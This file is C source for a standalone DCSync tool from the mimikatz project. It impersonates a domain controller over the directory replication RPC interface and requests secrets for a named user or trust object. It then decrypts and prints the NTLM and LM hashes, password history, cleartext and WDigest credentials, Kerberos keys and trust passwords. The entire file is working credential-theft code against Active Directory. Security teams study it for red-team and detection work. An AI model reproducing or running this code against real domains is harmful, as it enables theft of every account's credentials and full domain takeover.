/*	Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com / http://blog.gentilkiwi.com )
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "dcsync.h"

int wmain(int argc, wchar_t * argv[])
{
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DSNAME dsName = {0};
	DRS_MSG_GETCHGREQ getChReq = {0};
	DWORD dwOutVersion = 0;
	DRS_MSG_GETCHGREPLY getChRep = {0};
	ULONG drsStatus;
	DWORD ret;
	LPCWSTR szUser = NULL, szGuid = NULL, szDomain, szDc = NULL;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;

	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	kprintf(L"\n"
		L"  .#####.   " MIMIKATZ_FULL L"\n"
		L" .## ^ ##.  /* * *\n"
		L" ## / \\ ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" ## \\ / ##   Vincent LE TOUX            ( vincent.letoux@gmail.com )\n"
		L" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		L"  '#####'    http://www.mysmartlogon.com                      * * */\n\n");	
	
		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		{
			if(wcschr(szDomain, L'.'))
			{
				kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
				if(!kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
				{
					ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
					if(ret == ERROR_SUCCESS)
						szDc = cInfo->DomainControllerName + 2;
					else PRINT_ERROR(L"[DC] DsGetDcName: %u\n", ret);
				}

				if(szDc)
				{
					kprintf(L"[DC] \'%s\' will be the main server\n\n", szDc);
					if(rpc_factory_create(szDc, RpcSecurityCallback, &hBinding))
					{

						if(kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
						{
							if(szGuid)
								kprintf(L"[DC] Object with GUID \'%s\'\n\n", szGuid);
							else
								kprintf(L"[DC] \'%s\' will be the user account\n\n", szUser);

							if(rpc_factory_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid))
							{
								if(rpc_factory_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs))
								{
									getChReq.V8.pNC = &dsName;
									getChReq.V8.ulFlags = 0x00088000; // urgent, now!, 0x10 | 0x20 is cool too
									getChReq.V8.cMaxObjects = 1;
									getChReq.V8.cMaxBytes = 0x00a00000; // 10M
									getChReq.V8.ulExtendedOp = 7; // just in case, I want secrets!, 6 is cool too

									RpcTryExcept
									{
										drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
										if(drsStatus == 0)
										{
											if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
												descrObject(&getChRep.V6.pObjects[0].Entinf.AttrBlock, szDomain);
										}
										else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
										IDL_DRSUnbind(&hDrs);
									}
									RpcExcept((RpcExceptionCode() >=1700) && (RpcExceptionCode() <= 1999))
										PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
									RpcEndExcept
								}
							}
							rpc_factory_delete(&hBinding);
						}
						else PRINT_ERROR(L"Missing user or guid argument\n");
					}
				}
				if(cInfo)
					NetApiBufferFree(cInfo);
			}
			else PRINT_ERROR(L"Domain doesn\'t look like a FQDN\n");
		}
		else PRINT_ERROR(L"Missing domain argument\n");

		return 0;
}

SecPkgContext_SessionKey g_sKey = {0, NULL};
void RPC_ENTRY RpcSecurityCallback(_In_ void *Context)
{
	RPC_STATUS rpcStatus;
	SECURITY_STATUS secStatus;
	PCtxtHandle data = NULL;

	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *) &data);
	if(rpcStatus == RPC_S_OK)
	{
		if(g_sKey.SessionKey)
		{
			FreeContextBuffer(g_sKey.SessionKey);
			g_sKey.SessionKeyLength = 0;
			g_sKey.SessionKey = NULL;
		}
		secStatus = QueryContextAttributes((PCtxtHandle) data, SECPKG_ATTR_SESSION_KEY, (LPVOID) &g_sKey);
	}
}

BOOL decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	DWORD i;
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER cryptoData = {encodedDataSize - 16, encodedDataSize - 16, encodedData + 16}, cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL};
	BYTE data[LM_NTLM_HASH_LENGTH];

	MD5Init(&md5ctx);
	MD5Update(&md5ctx, g_sKey.SessionKey, g_sKey.SessionKeyLength);
	MD5Update(&md5ctx, encodedData, 16); // salt
	MD5Final(&md5ctx);
	cryptoKey.Buffer = md5ctx.digest;

	if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
	{
		cryptoData.Length = cryptoData.MaximumLength -= 4; // crc
		cryptoData.Buffer += 4;

		if(rid && prefix)
		{
			for(i = 0; i < cryptoData.Length; i+= LM_NTLM_HASH_LENGTH)
			{
				status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + i, &rid, data));
				if(status)
				{
					if(isHistory)
						kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
					else
						kprintf(L"  Hash %s: ", prefix);
					kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
					kprintf(L"\n");
				}
				else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
			}
		}
		else
		{
			status = TRUE;
		}
	}
	else PRINT_ERROR(L"RtlEncryptDecryptRC4");
	return status;
}

void descrObject(ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
{
	findPrintMonoAttr(L"Object RDN           : ", attributes, ATT_RDN, TRUE);
	kprintf(L"\n");
	if(findMonoAttr(attributes, ATT_SAM_ACCOUNT_NAME, NULL, NULL))
		descrUser(attributes);
	else if(findMonoAttr(attributes, ATT_TRUST_PARTNER, NULL, NULL))
		descrTrust(attributes, szSrcDomain);
}

void descrUser(ATTRBLOCK *attributes)
{
	DWORD rid = 0;
	PBYTE encodedData;
	DWORD encodedDataSize;
	PVOID data;

	kprintf(L"** USER ACCOUNT **\n\n");
	findPrintMonoAttr(L"SAM Username         : ", attributes, ATT_SAM_ACCOUNT_NAME, TRUE);
	findPrintMonoAttr(L"User Principal Name  : ", attributes, ATT_USER_PRINCIPAL_NAME, TRUE);
	
	if(findMonoAttr(attributes, ATT_SAM_ACCOUNT_TYPE, &data, NULL))
		kprintf(L"Account Type         : %08x\n", *(PDWORD) data);

	if(findMonoAttr(attributes, ATT_ACCOUNT_EXPIRES, &data, NULL))
	{
		kprintf(L"Account expiration   : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(findMonoAttr(attributes, ATT_PWD_LAST_SET, &data, NULL))
	{
		kprintf(L"Password last change : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(findMonoAttr(attributes, ATT_OBJECT_SID, &data, NULL))
	{
		kprintf(L"Object Security ID   : ");
		kull_m_string_displaySID(data);
		kprintf(L"\n");
		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
		kprintf(L"Object Relative ID   : %u\n", rid);

		kprintf(L"\nCredentials:\n");
		if(findMonoAttr(attributes, ATT_UNICODE_PWD, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
		if(findMonoAttr(attributes, ATT_NT_PWD_HISTORY, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);

		if(findMonoAttr(attributes, ATT_DBCS_PWD, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
		if(findMonoAttr(attributes, ATT_LM_PWD_HISTORY, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
	}

	if(findMonoAttr(attributes, ATT_SUPPLEMENTAL_CREDENTIALS, &encodedData, &encodedDataSize))
	{
		kprintf(L"\nSupplemental Credentials:\n");
		if(decrypt(encodedData, encodedDataSize, 0, NULL, FALSE))
			descrUserProperties((PUSER_PROPERTIES) (encodedData + 16 + 4)); // avoid SALT+CRC
	}
}

const UNICODE_STRING PrimaryCleartext = {34, 34, L"Primary:CLEARTEXT"};
const UNICODE_STRING PrimaryWDigest = {30, 30, L"Primary:WDigest"};
const UNICODE_STRING PrimaryKerberos = {32, 32, L"Primary:Kerberos"};
const UNICODE_STRING PrimaryKerberosNew = {54, 54, L"Primary:Kerberos-Newer-Keys"};
const UNICODE_STRING Packages = {16, 16, L"Packages"};
void descrUserProperties(PUSER_PROPERTIES properties)
{
	DWORD i, j, k, szData;
	PUSER_PROPERTY property;
	PBYTE data;
	UNICODE_STRING Name;
	LPSTR value;

	PWDIGEST_CREDENTIALS pWDigest;
	PKERB_STORED_CREDENTIAL pKerb;
	PKERB_KEY_DATA pKeyData;
	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
	PKERB_KEY_DATA_NEW pKeyDataNew;

	for(i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
	{
		Name.Length = Name.MaximumLength = property->NameLength;
		Name.Buffer = property->PropertyName;
		
		value = (LPSTR) ((LPCBYTE) property->PropertyName + property->NameLength);
		szData = property->ValueLength / 2;

		kprintf(L"* %wZ *\n", &Name);
		if(data = (PBYTE) LocalAlloc(LPTR, szData))
		{
			for(j = 0; j < szData; j++)
			{
				sscanf_s(&value[j*2], "%02x", &k);
				data[j] = (BYTE) k;
			}

			if(RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || RtlEqualUnicodeString(&Packages, &Name, TRUE))
			{
				kprintf(L"    %.*s\n", szData / sizeof(wchar_t), data);
			}
			else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
			{
				pWDigest = (PWDIGEST_CREDENTIALS) data;
				for(i = 0; i < pWDigest->NumberOfHashes; i++)
				{
					kprintf(L"    %02u  ", i + 1);
					kull_m_string_wprintf_hex(pWDigest->Hash[i], MD5_DIGEST_LENGTH, 0);
					kprintf(L"\n");
				}
			}
			else if(RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
			{
				pKerb = (PKERB_STORED_CREDENTIAL) data;
				kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerb + pKerb->DefaultSaltOffset);
				pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
				pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
				kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
			}
			else if(RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
			{
				pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) data;
				kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset, pKerbNew->DefaultIterationCount);
				pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
				kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
			}
			else kull_m_string_wprintf_hex(data, szData, 1);
			kprintf(L"\n");
			LocalFree(data);
		}
	}
}

void descrTrust(ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	UNICODE_STRING uPartner, uDomain, uUpcasePartner, uUpcaseDomain;
	
	kprintf(L"** TRUSTED DOMAIN **\n\n");
	
	if(findMonoAttr(attributes, ATT_TRUST_PARTNER, &encodedData, &encodedDataSize))
	{
		uPartner.Length = uPartner.MaximumLength = (USHORT) encodedDataSize;
		uPartner.Buffer = (PWSTR) encodedData;
		kprintf(L"Partner              : %wZ\n", &uPartner);
		if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcasePartner, &uPartner, TRUE)))
		{
			RtlInitUnicodeString(&uDomain, szSrcDomain);
			if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcaseDomain, &uDomain, TRUE)))
			{
				descrTrustAuthentication(attributes, ATT_TRUST_AUTH_INCOMING, &uUpcaseDomain, &uUpcasePartner);
				descrTrustAuthentication(attributes, ATT_TRUST_AUTH_OUTGOING, &uUpcaseDomain, &uUpcasePartner);
				RtlFreeUnicodeString(&uUpcaseDomain);
			}
			RtlFreeUnicodeString(&uUpcasePartner);
		}
	}
}

void descrTrustAuthentication(ATTRBLOCK *attributes, ATTRTYP type, PCUNICODE_STRING domain, PCUNICODE_STRING partner)
{
	PBYTE encodedData;
	DWORD encodedDataSize;//, number;
	PNTDS_LSA_AUTH_INFORMATIONS authInfos;
	LPCWSTR prefix, prefixOld;
	PCUNICODE_STRING from, dest;

	if(findMonoAttr(attributes, type, &encodedData, &encodedDataSize))
	{
		if(decrypt(encodedData, encodedDataSize, 0, NULL, FALSE))
		{
			if(type == ATT_TRUST_AUTH_INCOMING)
			{
				prefix = L"  In ";
				prefixOld = L" In-1";
				from = domain;
				dest = partner;
			}
			else
			{
				prefix = L" Out ";
				prefixOld = L"Out-1";
				from = partner;
				dest = domain;
			}
			
			authInfos = (PNTDS_LSA_AUTH_INFORMATIONS) (encodedData + 4 + 16);
			if(authInfos->count)
			{
				if(authInfos->offsetToAuthenticationInformation)
					kuhl_m_lsadump_trust_authinformation((PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToAuthenticationInformation), prefix, from, dest);
				if(authInfos->offsetToPreviousAuthenticationInformation)
					kuhl_m_lsadump_trust_authinformation((PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToPreviousAuthenticationInformation), prefixOld, from, dest);
			}
		}
	}
}

PVOID findMonoAttr(ATTRBLOCK *attributes, ATTRTYP type, PVOID data, DWORD *size)
{
	PVOID ptr = NULL;
	DWORD i;
	ATTR *attribut;

	if(data)
		*(PVOID *)data = NULL;
	if(size)
		*size = 0;

	for(i = 0; i < attributes->attrCount; i++)
	{
		attribut = &attributes->pAttr[i];
		if(attribut->attrTyp == type)
		{
			if(attribut->AttrVal.valCount == 1)
			{
				ptr = attribut->AttrVal.pAVal[0].pVal;
				if(data)
					*(PVOID *)data = ptr;
				if(size)
					*size = attribut->AttrVal.pAVal[0].valLen;
			}
			break;
		}
	}
	return ptr;
}

void findPrintMonoAttr(LPCWSTR prefix, ATTRBLOCK *attributes, ATTRTYP type, BOOL newLine)
{
	PVOID ptr;
	DWORD sz;
	if(findMonoAttr(attributes, type, &ptr, &sz))
		kprintf(L"%s%.*s%s", prefix ? prefix : L"", sz / sizeof(wchar_t), ptr, newLine ? L"\n" : L"");
}

PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
{
	USHORT i;
	if(Count)
	{
		if(title)
			kprintf(L"    %s\n", title);
		for(i = 0; i < Count; i++)
		{
			kprintf(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			kprintf(L"\n");
		}
	}
	return (PKERB_KEY_DATA) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA));
}

PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
{
	USHORT i;
	if(Count)
	{
		if(title)
			kprintf(L"    %s\n", title);
		for(i = 0; i < Count; i++)
		{
			kprintf(L"      %s (%u) : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			kprintf(L"\n");
		}
	}
	return (PKERB_KEY_DATA_NEW) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA_NEW));
}

PCWCHAR kuhl_m_kerberos_ticket_etype(LONG eType)
{
	PCWCHAR type;
	switch(eType)
	{
	case KERB_ETYPE_NULL:							type = L"null             "; break;
	case KERB_ETYPE_DES_PLAIN:						type = L"des_plain        "; break;
	case KERB_ETYPE_DES_CBC_CRC:					type = L"des_cbc_crc      "; break;
	case KERB_ETYPE_DES_CBC_MD4:					type = L"des_cbc_md4      "; break;
	case KERB_ETYPE_DES_CBC_MD5:					type = L"des_cbc_md5      "; break;
	case KERB_ETYPE_DES_CBC_MD5_NT:					type = L"des_cbc_md5_nt   "; break;
	case KERB_ETYPE_RC4_PLAIN:						type = L"rc4_plain        "; break;
	case KERB_ETYPE_RC4_PLAIN2:						type = L"rc4_plain2       "; break;
	case KERB_ETYPE_RC4_PLAIN_EXP:					type = L"rc4_plain_exp    "; break;
	case KERB_ETYPE_RC4_LM:							type = L"rc4_lm           "; break;
	case KERB_ETYPE_RC4_MD4:						type = L"rc4_md4          "; break;
	case KERB_ETYPE_RC4_SHA:						type = L"rc4_sha          "; break;
	case KERB_ETYPE_RC4_HMAC_NT:					type = L"rc4_hmac_nt      "; break;
	case KERB_ETYPE_RC4_HMAC_NT_EXP:				type = L"rc4_hmac_nt_exp  "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD:					type = L"rc4_plain_old    "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD_EXP:				type = L"rc4_plain_old_exp"; break;
	case KERB_ETYPE_RC4_HMAC_OLD:					type = L"rc4_hmac_old     "; break;
	case KERB_ETYPE_RC4_HMAC_OLD_EXP:				type = L"rc4_hmac_old_exp "; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes128_hmac_plain"; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes256_hmac_plain"; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:		type = L"aes128_hmac      "; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:		type = L"aes256_hmac      "; break;
	default:										type = L"unknow           "; break;
	}
	return type;
}

NTSTATUS kuhl_m_kerberos_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count)
{
	PKERB_ECRYPT pCSystem;
	NTSTATUS status = CDLocateCSystem(keyType, &pCSystem);
	PVOID buffer;
	if(NT_SUCCESS(status))
	{
		if(buffer = LocalAlloc(LPTR, pCSystem->KeySize))
		{
			status = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(pString, buffer) : pCSystem->HashPassword_NT6(pString, pSalt, count, buffer);
			if(NT_SUCCESS(status))
			{
				kprintf(L"\t* %s ", kuhl_m_kerberos_ticket_etype(keyType));
				kull_m_string_wprintf_hex(buffer, pCSystem->KeySize, 0);
				kprintf(L"\n");
			}
			else PRINT_ERROR(L"HashPassword : %08x\n", status);
			LocalFree(buffer);
		}
	}
	return status;
}

const wchar_t * TRUST_AUTH_TYPE[] = {
	L"NONE   ",
	L"NT4OWF ",
	L"CLEAR  ",
	L"VERSION",
};
const UNICODE_STRING uKrbtgt = {12, 14, L"krbtgt"};
void kuhl_m_lsadump_trust_authinformation(PNTDS_LSA_AUTH_INFORMATION info, PCWSTR prefix, PCUNICODE_STRING from, PCUNICODE_STRING dest)
{
	DWORD i;
	UNICODE_STRING dst, password;
	LONG kerbType[] = {KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, KERB_ETYPE_RC4_HMAC_NT};

	kprintf(L" [%s] %wZ -> %wZ\n", prefix, from, dest);
	kprintf(L"    * "); kull_m_string_displayLocalFileTime((PFILETIME) &info->LastUpdateTime);
	kprintf((info->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (info->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[info->AuthType] : L"unknown?");
	kull_m_string_wprintf_hex(info->AuthInfo, info->AuthInfoLength, 1); kprintf(L"\n");

	if(info->AuthType == TRUST_AUTH_TYPE_CLEAR)
	{
		dst.Length = 0;
		dst.MaximumLength = from->Length + uKrbtgt.Length + dest->Length;
		if(dst.Buffer = (PWSTR) LocalAlloc(LPTR, dst.MaximumLength))
		{
			RtlAppendUnicodeStringToString(&dst, from);
			RtlAppendUnicodeStringToString(&dst, &uKrbtgt);
			RtlAppendUnicodeStringToString(&dst, dest);
			password.Length = password.MaximumLength = (USHORT) info->AuthInfoLength;
			password.Buffer = (PWSTR) info->AuthInfo;
			for(i = 0; i < ARRAYSIZE(kerbType); i++)
				kuhl_m_kerberos_hash_data(kerbType[i], &password, &dst, 4096);
			LocalFree(dst.Buffer);
		}
	}
	kprintf(L"\n");
}